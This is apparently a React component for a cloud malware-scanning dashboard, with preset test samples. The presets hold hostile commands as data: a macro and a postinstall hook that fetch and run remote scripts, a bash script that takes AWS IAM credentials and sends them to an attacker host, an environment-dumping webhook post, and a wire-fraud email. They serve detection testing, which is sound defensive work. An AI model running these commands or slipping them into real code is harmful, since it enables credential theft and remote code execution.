import React, { useState, useEffect } from "react";
import api from "../lib/api.js";
import { useToast } from "../context/ToastContext.jsx";
import {
  Cloud,
  Mail,
  HardDrive,
  GitBranch,
  CheckCircle2,
  AlertTriangle,
  RefreshCw,
  ShieldCheck,
  ShieldAlert,
  Search,
  Zap,
  Lock,
  ArrowRight,
  FileText,
  Loader2,
  Database,
  MessageSquare,
  Eye,
  Unlink,
} from "lucide-react";
import FunctionGuide from "../components/ui/FunctionGuide.jsx";

export function ConnectedApps({ onInspectIncident }) {
  const [integrations, setIntegrations] = useState([]);
  const [items, setItems] = useState([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState("all");
  const [syncingId, setSyncingId] = useState(null);
  const [connectingId, setConnectingId] = useState(null);

  // On-demand test form
  const [testAppId, setTestAppId] = useState("gmail");
  const [testItemName, setTestItemName] = useState("Invoice_94821.pdf.vbs");
  const [testSource, setTestSource] = useState("From: billing@urgent-notification.xyz [Subject: Urgent Wire Notice]");
  const [testContent, setTestContent] = useState(`Sub AutoOpen()\n  Set sh = CreateObject("WScript.Shell")\n  sh.Run "powershell.exe -ep bypass -w hidden -c (curl http://194.26.29.112/payload.ps1 | iex)"\nEnd Sub`);
  const [scanningTest, setScanningTest] = useState(false);

  const toast = useToast();

  const loadData = async () => {
    try {
      const [appsData, itemsData] = await Promise.all([
        api.getIntegrations(),
        api.getIntegrationItems(),
      ]);
      setIntegrations(appsData);
      setItems(itemsData);
    } catch (err) {
      toast.error(err.message || "Failed to load cloud app integrations");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  const handleSync = async (appId) => {
    setSyncingId(appId);
    try {
      await api.syncIntegration(appId);
      toast.success(`Synchronized and scanned ${appId.replace("_", " ")}`);
      await loadData();
    } catch (err) {
      toast.error(err.message || "Sync failed");
    } finally {
      setSyncingId(null);
    }
  };

  const handleToggleConnect = async (appId, currentlyConnected) => {
    setConnectingId(appId);
    try {
      await api.connectIntegration(appId, !currentlyConnected);
      toast.success(
        currentlyConnected
          ? `Disconnected ${appId.replace("_", " ")}`
          : `Connected & authorized ${appId.replace("_", " ")}`
      );
      await loadData();
    } catch (err) {
      toast.error(err.message || "Failed to update integration connection");
    } finally {
      setConnectingId(null);
    }
  };

  const handleIsolate = async (id) => {
    try {
      await api.isolateIntegrationItem(id);
      toast.warn("Item quarantined and isolated from active sync");
      await loadData();
    } catch (err) {
      toast.error(err.message || "Failed to isolate item");
    }
  };

  const handleRunTestScan = async () => {
    if (!testContent.trim()) {
      toast.error("Please provide attachment or script content to scan");
      return;
    }
    setScanningTest(true);
    try {
      const newItem = await api.scanIntegrationItem({
        appId: testAppId,
        itemName: testItemName,
        itemType: "attachment",
        sourceLocation: testSource,
        content: testContent,
      });

      if (newItem.status === "infected") {
        toast.error(`Malware Detected in ${testAppId}! Item quarantined.`);
      } else {
        toast.success("Attachment verified clean with zero signatures.");
      }
      await loadData();
    } catch (err) {
      toast.error(err.message || "Scan failed");
    } finally {
      setScanningTest(false);
    }
  };

  const loadPreset = (type) => {
    if (type === "drive_trojan") {
      setTestAppId("google_drive");
      setTestItemName("Google_Drive_Setup.exe");
      setTestSource("/Shared with me/External Guest/Google_Drive_Setup.exe");
      setTestContent(`REM Disguised Google Drive Updater Trojan\nSet oShell = CreateObject("WScript.Shell")\noShell.Run "powershell.exe -w hidden -enc JABjAGwAYQ... (Remote Payload Execution)"\noShell.Popup "Google Drive Updated Successfully"`);
    } else if (type === "mail_macro") {
      setTestAppId("gmail");
      setTestItemName("Invoice_94821.pdf.vbs");
      setTestSource("From: billing@urgent-notification.xyz [Subject: Overdue Wire Notice]");
      setTestContent(`Sub AutoOpen()\n  Set sh = CreateObject("WScript.Shell")\n  sh.Run "powershell.exe -ep bypass -w hidden -c (curl http://194.26.29.112/payload.ps1 | iex)"\nEnd Sub`);
    } else if (type === "aws_s3_secret") {
      setTestAppId("aws_s3");
      setTestItemName("s3_iam_secret_exfiltration.sh");
      setTestSource("s3://enterprise-prod-vault/ops/bootstrap/s3_iam_secret_exfiltration.sh");
      setTestContent(`#!/bin/bash\n# Malicious IAM Role Credential Harvesting\nTOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\ncurl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role | curl -d @- https://c2.attacker.xyz/exfil\naws s3 sync s3://enterprise-prod-vault/ /tmp/dump/`);
    } else if (type === "outlook_bec") {
      setTestAppId("outlook");
      setTestItemName("Wire_Transfer_Routing_Notice.eml");
      setTestSource("From: ceo.office@lookalike-corp.com [Subject: URGENT: Wire Remittance Redirect]");
      setTestContent(`From: ceo.office@lookalike-corp.com\nTo: finance-ops@enterprise-corp.io\nSubject: URGENT: Wire Remittance Redirect\n\nPlease immediately hold pending $480,000 contractor disbursements and route wire funds to our new corporate clearing account: IBAN: GB82BARC20000087654321, Routing: 200000. Keep strictly confidential until audit closure.`);
    } else if (type === "slack_token") {
      setTestAppId("slack");
      setTestItemName("slack_webhook_grabber.py");
      setTestSource("Channel: #engineering-general [Shared by external guest]");
      setTestContent(`import requests, os\n# Unauthorized Slack Incoming Webhook Exfiltration\nHOOK = "https://slack-webhook.internal-mock.net/services/T00000000/B00000000/MOCK_TOKEN_EXFILTRATION"\nrequests.post(HOOK, json={"text": "SYSTEM HIJACKED: Exfiltrating environment secrets: " + str(dict(os.environ))})`);
    } else if (type === "github_backdoor") {
      setTestAppId("github");
      setTestItemName("package.json (PR #14: Added Fast Stream Utility)");
      setTestSource("Repo: enterprise-secops-org/api-gateway [Branch: main]");
      setTestContent(`{\n  "name": "fast-stream-util",\n  "version": "1.0.4",\n  "scripts": {\n    "postinstall": "curl -s http://194.26.29.112/payload.sh | bash"\n  }\n}`);
    } else if (type === "drive_clean") {
      setTestAppId("google_drive");
      setTestItemName("Q4_Financial_Summary.pdf");
      setTestSource("/My Drive/Finance/Q4_Financial_Summary.pdf");
      setTestContent(`%PDF-1.4\n1 0 obj << /Title (Q4 Financial Report) /Author (Enterprise Corp) >> endobj\n2 0 obj << /Type /Catalog /Pages 3 0 R >> endobj\nStandard business financial statements verified clean.`);
    }
  };

  const filteredItems = items.filter((item) => {
    if (filter === "infected") return item.status === "infected" || item.quarantined;
    if (filter === "google_drive") return item.appId === "google_drive";
    if (filter === "gmail") return item.appId === "gmail";
    if (filter === "outlook") return item.appId === "outlook";
    if (filter === "aws_s3") return item.appId === "aws_s3";
    if (filter === "github") return item.appId === "github";
    if (filter === "slack") return item.appId === "slack";
    return true;
  });

  const getAppIcon = (appId) => {
    switch (appId) {
      case "google_drive":
        return <HardDrive className="w-5 h-5 text-cyan-400" />;
      case "gmail":
        return <Mail className="w-5 h-5 text-rose-400" />;
      case "outlook":
        return <Mail className="w-5 h-5 text-indigo-400" />;
      case "aws_s3":
        return <Database className="w-5 h-5 text-amber-400" />;
      case "github":
        return <GitBranch className="w-5 h-5 text-emerald-400" />;
      case "slack":
        return <MessageSquare className="w-5 h-5 text-purple-400" />;
      default:
        return <Cloud className="w-5 h-5 text-slate-400" />;
    }
  };

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2">
            <h1 className="text-xl font-bold text-slate-100 font-mono tracking-tight">
              Mail & Drive Apps Malware Shield
            </h1>
            <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyan-950 text-cyan-300 border border-cyan-800">
              ZERO-TRUST CLOUD INGRESS
            </span>
          </div>
          <p className="text-xs text-slate-400 mt-1">
            Continuous threat defense connected across Google Drive, Gmail, Microsoft Outlook 365, AWS S3 Storage, GitHub, and Slack to intercept trojans, weaponized attachments, credential leaks, and wire fraud.
          </p>
        </div>

        <button
          onClick={loadData}
          disabled={loading}
          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono font-medium bg-[#0f172a] text-slate-300 border border-[#1e293b] hover:border-cyan-500 hover:text-cyan-400 transition-colors cursor-pointer"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
          Refresh Status
        </button>
      </div>

      {/* Connected Multi-Cloud & Mail Apps Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
        {integrations.map((app) => (
          <div
            key={app.id}
            className="p-5 rounded-xl bg-[#0f172a] border border-[#1e293b] hover:border-cyan-800 transition-all flex flex-col justify-between gap-4 shadow-lg"
          >
            <div>
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2.5">
                  <div className="p-2 rounded-lg bg-slate-900 border border-slate-800">
                    {getAppIcon(app.id)}
                  </div>
                  <div>
                    <h3 className="text-sm font-bold text-slate-100">{app.name}</h3>
                    <span className="text-[10px] font-mono text-slate-400">{app.category}</span>
                  </div>
                </div>

                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase ${
                    app.connected
                      ? "bg-emerald-950 text-emerald-300 border border-emerald-800"
                      : "bg-slate-900 text-slate-400 border border-slate-800"
                  }`}
                >
                  {app.connected ? "● SYNCED" : "○ READY"}
                </span>
              </div>

              <div className="grid grid-cols-2 gap-2 mt-3 p-2.5 rounded-lg bg-slate-950/70 border border-slate-900 text-xs font-mono">
                <div>
                  <span className="text-[10px] text-slate-500 block">SCANNED</span>
                  <span className="font-bold text-cyan-400">{app.scannedCount} items</span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 block">THREATS</span>
                  <span
                    className={`font-bold ${
                      app.threatsCount > 0 ? "text-rose-400" : "text-emerald-400"
                    }`}
                  >
                    {app.threatsCount} blocked
                  </span>
                </div>
              </div>
            </div>

            <div className="flex items-center justify-between pt-2 border-t border-slate-800/80 gap-2">
              <span className="text-[10px] font-mono text-slate-400 truncate max-w-[130px]" title={app.account || "Not connected"}>
                {app.account || "Not Connected"}
              </span>

              <div className="flex items-center gap-1.5 shrink-0">
                <button
                  onClick={() => handleToggleConnect(app.id, app.connected)}
                  disabled={connectingId === app.id}
                  className={`px-2 py-1 rounded text-[11px] font-mono font-medium transition-colors cursor-pointer ${
                    app.connected
                      ? "bg-slate-900 text-slate-400 hover:text-rose-400 hover:bg-rose-950/20 border border-slate-800"
                      : "bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold"
                  }`}
                >
                  {connectingId === app.id ? (
                    <Loader2 className="w-3 h-3 animate-spin inline mr-1" />
                  ) : null}
                  {app.connected ? "Disconnect" : "Connect"}
                </button>

                {app.connected && (
                  <button
                    onClick={() => handleSync(app.id)}
                    disabled={syncingId === app.id}
                    className="flex items-center gap-1 px-2 py-1 rounded text-[11px] font-mono font-medium bg-cyan-950/80 text-cyan-300 border border-cyan-800 hover:bg-cyan-900 hover:text-cyan-200 transition-colors cursor-pointer"
                  >
                    {syncingId === app.id ? (
                      <Loader2 className="w-3 h-3 animate-spin" />
                    ) : (
                      <Zap className="w-3 h-3 text-cyan-400" />
                    )}
                    <span>Sync</span>
                  </button>
                )}
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Main 2-Column Split: Monitored Items Stream + On-demand Attachment Inspector */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left: Monitored Drive Files, Email Attachments, and Cloud Objects */}
        <div className="lg:col-span-7 space-y-4">
          <div className="p-5 rounded-2xl bg-[#0f172a] border border-[#1e293b] shadow-xl">
            <div className="flex flex-col gap-3 mb-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <ShieldAlert className="w-4 h-4 text-rose-400" />
                  <h3 className="text-sm font-bold text-slate-100 font-mono">
                    Cloud Ingress Stream & Scanned Artifacts
                  </h3>
                </div>
                <span className="text-[10px] font-mono text-cyan-400 bg-cyan-950/80 px-2 py-0.5 rounded border border-cyan-800/80">
                  {filteredItems.length} ARTIFACTS
                </span>
              </div>

              {/* Service Filter Chips */}
              <div className="flex flex-wrap items-center gap-1 bg-slate-900/90 p-1.5 rounded-xl border border-slate-800 text-[10px] font-mono">
                {[
                  { id: "all", label: "All Services" },
                  { id: "infected", label: "Threats Only" },
                  { id: "google_drive", label: "Google Drive" },
                  { id: "gmail", label: "Gmail" },
                  { id: "outlook", label: "Outlook 365" },
                  { id: "aws_s3", label: "AWS S3" },
                  { id: "github", label: "GitHub" },
                  { id: "slack", label: "Slack" },
                ].map((chip) => (
                  <button
                    key={chip.id}
                    onClick={() => setFilter(chip.id)}
                    className={`px-2.5 py-1 rounded-lg transition-colors cursor-pointer ${
                      filter === chip.id
                        ? "bg-cyan-500 text-slate-950 font-bold shadow"
                        : "text-slate-400 hover:text-slate-200 hover:bg-slate-800/60"
                    }`}
                  >
                    {chip.label}
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-3 max-h-[560px] overflow-y-auto pr-1">
              {filteredItems.length === 0 ? (
                <div className="text-center py-12 text-slate-500 text-xs font-mono">
                  No artifacts found matching "{filter}". Try selecting "All Services".
                </div>
              ) : (
                filteredItems.map((item) => (
                  <div
                    key={item.id}
                    className={`p-3.5 rounded-xl border transition-all ${
                      item.status === "infected"
                        ? "bg-rose-950/20 border-rose-900/40"
                        : "bg-slate-900/60 border-slate-800"
                    }`}
                  >
                    <div className="flex items-start justify-between gap-3">
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="text-sm">
                            {item.status === "infected" ? "⚠️" : "📄"}
                          </span>
                          <span className="text-xs font-bold text-slate-200 font-mono">
                            {item.name}
                          </span>
                        </div>
                        <p className="text-[10px] text-slate-400 font-mono mt-1 break-all">
                          {item.sourceLocation}
                        </p>
                      </div>

                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase whitespace-nowrap ${
                          item.status === "clean"
                            ? "bg-emerald-950 text-emerald-300 border border-emerald-800"
                            : "bg-rose-950 text-rose-300 border border-rose-800"
                        }`}
                      >
                        {item.verdict}
                      </span>
                    </div>

                    {item.findings && item.findings.length > 0 && (
                      <div className="mt-2.5 p-2 rounded bg-slate-950/80 border border-rose-900/30 text-[10px] font-mono text-rose-300 space-y-1">
                        {item.findings.map((f, i) => (
                          <div key={i} className="flex items-center justify-between">
                            <span>
                              [{f.id}] {f.name}
                            </span>
                            <span className="uppercase text-[9px] font-bold text-rose-400">
                              {f.severity}
                            </span>
                          </div>
                        ))}
                      </div>
                    )}

                    <div className="flex items-center justify-between mt-3 pt-2 border-t border-slate-800/60 text-[10px] font-mono">
                      <span className="text-slate-500">
                        App: <strong className="text-slate-300">{item.appName}</strong> • {(item.sizeBytes / 1024).toFixed(1)} KB
                      </span>

                      <div className="flex items-center gap-2">
                        {item.status === "infected" && onInspectIncident && (
                          <button
                            onClick={() => onInspectIncident(null, item.id)}
                            className="flex items-center gap-1 px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-cyan-300 border border-cyan-800/80 transition-colors cursor-pointer text-[10px]"
                          >
                            <Eye className="w-3 h-3 text-cyan-400" />
                            <span>Forensics</span>
                          </button>
                        )}

                        {item.quarantined ? (
                          <span className="px-2 py-0.5 rounded bg-rose-950/80 text-rose-300 border border-rose-800 font-bold text-[9px]">
                            QUARANTINED
                          </span>
                        ) : item.status === "infected" ? (
                          <button
                            onClick={() => handleIsolate(item.id)}
                            className="px-2.5 py-0.5 rounded bg-rose-600 hover:bg-rose-500 text-slate-950 font-bold transition-colors cursor-pointer text-[10px]"
                          >
                            Quarantine
                          </button>
                        ) : (
                          <span className="text-emerald-400 font-bold flex items-center gap-1">
                            <CheckCircle2 className="w-3 h-3" /> VERIFIED
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        {/* Right: On-Demand Drive, Email, S3, Slack & GitHub Attachment Inspector */}
        <div className="lg:col-span-5 space-y-4">
          <div className="p-5 rounded-2xl bg-[#0f172a] border border-[#1e293b] shadow-xl space-y-4">
            <div>
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-cyan-400" />
                <h3 className="text-sm font-bold text-slate-100 font-mono">
                  Test Ingress Payload & Cloud Threat
                </h3>
              </div>
              <p className="text-xs text-slate-400 mt-1">
                Simulate inbound threat payloads across Gmail, Drive, Outlook, AWS S3, GitHub, or Slack to trigger zero-trust sandboxing and AST analysis.
              </p>
            </div>

            {/* Presets for all apps */}
            <div>
              <span className="text-[10px] font-mono text-slate-500 block mb-1.5">
                Quick Test Samples Across Cloud Services:
              </span>
              <div className="flex flex-wrap gap-1.5">
                <button
                  type="button"
                  onClick={() => loadPreset("mail_macro")}
                  className="px-2 py-1 rounded text-[10px] font-mono font-medium bg-slate-900 hover:bg-rose-950/50 text-slate-300 hover:text-rose-300 border border-slate-800 hover:border-rose-800 transition-colors cursor-pointer"
                >
                  Gmail VBS Macro
                </button>
                <button
                  type="button"
                  onClick={() => loadPreset("drive_trojan")}
                  className="px-2 py-1 rounded text-[10px] font-mono font-medium bg-slate-900 hover:bg-rose-950/50 text-slate-300 hover:text-rose-300 border border-slate-800 hover:border-rose-800 transition-colors cursor-pointer"
                >
                  Drive Setup.exe
                </button>
                <button
                  type="button"
                  onClick={() => loadPreset("aws_s3_secret")}
                  className="px-2 py-1 rounded text-[10px] font-mono font-medium bg-slate-900 hover:bg-amber-950/50 text-slate-300 hover:text-amber-300 border border-slate-800 hover:border-amber-800 transition-colors cursor-pointer"
                >
                  AWS S3 Key Leak
                </button>
                <button
                  type="button"
                  onClick={() => loadPreset("outlook_bec")}
                  className="px-2 py-1 rounded text-[10px] font-mono font-medium bg-slate-900 hover:bg-rose-950/50 text-slate-300 hover:text-rose-300 border border-slate-800 hover:border-rose-800 transition-colors cursor-pointer"
                >
                  Outlook Wire BEC
                </button>
                <button
                  type="button"
                  onClick={() => loadPreset("slack_token")}
                  className="px-2 py-1 rounded text-[10px] font-mono font-medium bg-slate-900 hover:bg-purple-950/50 text-slate-300 hover:text-purple-300 border border-slate-800 hover:border-purple-800 transition-colors cursor-pointer"
                >
                  Slack Webhook
                </button>
                <button
                  type="button"
                  onClick={() => loadPreset("github_backdoor")}
                  className="px-2 py-1 rounded text-[10px] font-mono font-medium bg-slate-900 hover:bg-rose-950/50 text-slate-300 hover:text-rose-300 border border-slate-800 hover:border-rose-800 transition-colors cursor-pointer"
                >
                  GitHub PR Trojan
                </button>
                <button
                  type="button"
                  onClick={() => loadPreset("drive_clean")}
                  className="px-2 py-1 rounded text-[10px] font-mono font-medium bg-slate-900 hover:bg-emerald-950/50 text-slate-300 hover:text-emerald-300 border border-slate-800 hover:border-emerald-800 transition-colors cursor-pointer"
                >
                  Clean Drive PDF
                </button>
              </div>
            </div>

            {/* Form Fields */}
            <div className="space-y-3">
              <div>
                <label className="text-[10px] font-mono text-slate-400 block mb-1">
                  Target Cloud / App Connector
                </label>
                <select
                  value={testAppId}
                  onChange={(e) => setTestAppId(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500"
                >
                  <option value="google_drive">Google Drive Cloud Storage</option>
                  <option value="gmail">Google Mail (Gmail Workspace)</option>
                  <option value="outlook">Microsoft Outlook 365</option>
                  <option value="aws_s3">AWS S3 Corporate Storage & Buckets</option>
                  <option value="github">GitHub Enterprise Repositories</option>
                  <option value="slack">Slack Team File Drops</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] font-mono text-slate-400 block mb-1">
                  Artifact / Attachment Name
                </label>
                <input
                  type="text"
                  value={testItemName}
                  onChange={(e) => setTestItemName(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="text-[10px] font-mono text-slate-400 block mb-1">
                  Source Header / Storage Path
                </label>
                <input
                  type="text"
                  value={testSource}
                  onChange={(e) => setTestSource(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="text-[10px] font-mono text-slate-400 block mb-1">
                  Attachment / Payload Content
                </label>
                <textarea
                  rows={6}
                  value={testContent}
                  onChange={(e) => setTestContent(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-500"
                  placeholder="Paste script, macro, invoice, or cloud payload content..."
                />
              </div>

              <button
                type="button"
                onClick={handleRunTestScan}
                disabled={scanningTest}
                className="w-full py-2.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold font-mono text-xs flex items-center justify-center gap-2 transition-all shadow-[0_0_16px_rgba(6,182,212,0.3)] disabled:opacity-50 cursor-pointer"
              >
                {scanningTest ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span>Analyzing Ingress Threat Payload...</span>
                  </>
                ) : (
                  <>
                    <ShieldCheck className="w-4 h-4" />
                    <span>Run Ingress Malware Scan</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Operational Guidelines for Mail, Drive & Multi-Cloud Apps */}
      <FunctionGuide
        moduleName="Mail, Drive & Multi-Cloud Apps Malware Shield"
        badge="CLOUD INGRESS SCANNER"
        color="#f59e0b"
        steps={[
          {
            num: "01",
            heading: "Connect & Authorize Cloud Services",
            detail: "Manage authorization for Google Drive, Gmail, Outlook 365, AWS S3, GitHub, and Slack. Click 'Connect' or 'Sync' on any card to poll latest artifacts.",
            tip: "Shows live connection status, scanned counts, and blocked threats.",
          },
          {
            num: "02",
            heading: "Filter Artifacts by Individual Service",
            detail: "Use the filter chips to switch between All, Google Drive, Gmail, Outlook 365, AWS S3, GitHub, Slack, or isolate Threats Only.",
            tip: "Each artifact displays real-time verdict and threat findings.",
          },
          {
            num: "03",
            heading: "Test Live Ingress Threats & Presets",
            detail: "Select test presets for Gmail VBS macros, Drive Trojan Setup, AWS S3 Key Leaks, Outlook Wire BEC, Slack Webhook grabbers, or GitHub PR Trojans.",
            tip: "Simulates zero-day ingress attacks safely in memory.",
          },
          {
            num: "04",
            heading: "1-Click Quarantine & Forensics Inspection",
            detail: "Click 'Quarantine' to immediately isolate any infected file from team access, or click 'Forensics' to inspect detailed incident telemetry and AI remediation patches.",
            tip: "Isolated files are permanently severed from active synchronizations.",
          },
        ]}
        proTips={[
          "Ingress scanning checks connected inboxes and cloud storage to isolate zero-day macros and trojans before end-users download them.",
          "AWS S3 & GitHub integrations monitor for leaked IAM access keys and malicious lifecycle scripts in pull requests.",
        ]}
      />
    </div>
  );
}

export default ConnectedApps;
